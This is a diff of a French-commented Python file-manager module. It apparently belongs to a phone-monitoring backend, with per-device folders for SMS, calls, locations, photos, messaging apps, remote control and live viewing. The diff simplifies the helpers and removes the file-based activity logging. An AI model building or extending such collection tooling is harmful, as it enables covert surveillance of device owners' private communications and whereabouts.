@@ -1,4 +1,4 @@
-# file_manager.py (version corrigée)
+# file_manager.py
 import os
 import re
 import shutil
@@ -16,10 +16,11 @@ def validate_device_id(input_str):
     return any(re.match(p, input_str) for p in patterns)
 
 def create_device_folder(device_id):
-    """Crée l'arborescence complète pour un nouvel appareil"""
+    """Crée l'arborescence pour un nouvel appareil"""
     base_path = os.path.join(DATA_PATH, device_id)
     os.makedirs(base_path, exist_ok=True)
     
+    # Créer les sous-dossiers principaux
     subfolders = [
         'sms_mms', 'appels', 'localisations', 'photos', 'messageries',
         'controle_distance', 'visualisation_directe', 'fichiers',
@@ -30,14 +31,10 @@ def create_device_folder(device_id):
     for folder in subfolders:
         os.makedirs(os.path.join(base_path, folder), exist_ok=True)
     
-    # Créer le fichier de log
-    with open(os.path.join(base_path, 'logs', 'activity.log'), 'w') as f:
-        f.write(f"Initialisation du dossier pour {device_id} à {datetime.now()}\n")
-    
     return base_path
 
 def delete_device_folder(device_id):
-    """Supprime complètement un dossier d'appareil"""
+    """Supprime un dossier d'appareil"""
     try:
         base_path = os.path.join(DATA_PATH, device_id)
         if os.path.exists(base_path):
@@ -66,7 +63,7 @@ def list_files(directory):
         return []
 
 def log_activity(db_name, device_id, action, file_path=None):
-    """Journalise une activité dans la base de données"""
+    """Journalise une activité"""
     try:
         conn = sqlite3.connect(db_name)
         c = conn.cursor()
@@ -76,15 +73,6 @@ def log_activity(db_name, device_id, action, file_path=None):
         )
         conn.commit()
         conn.close()
-        
-        # Ajouter au fichier de log
-        log_dir = os.path.join(DATA_PATH, device_id, 'logs')
-        os.makedirs(log_dir, exist_ok=True)
-        
-        with open(os.path.join(log_dir, 'activity.log'), 'a') as f:
-            log_entry = f"[{datetime.now()}] {action}: {file_path or 'N/A'}\n"
-            f.write(log_entry)
-            
         return True
     except Exception as e:
         print(f"Erreur journalisation: {e}")
